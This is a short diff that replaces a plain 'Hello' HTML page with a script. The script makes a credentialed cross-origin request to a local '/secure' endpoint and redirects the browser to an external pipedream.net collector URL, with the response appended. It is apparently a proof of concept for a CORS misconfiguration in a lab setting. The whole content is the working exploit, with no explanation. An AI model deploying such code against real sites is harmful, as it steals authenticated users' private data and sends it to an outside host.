@@ -1,3 +1,12 @@
-<head></head>
-<body><h1>Hello</h1></body>
-
+<html>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','http://127.0.0.1:5000/secure',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+location='https://eoyfk2knj44n8x1.m.pipedream.net'+this.responseText;
+};
+</script>
+</html>
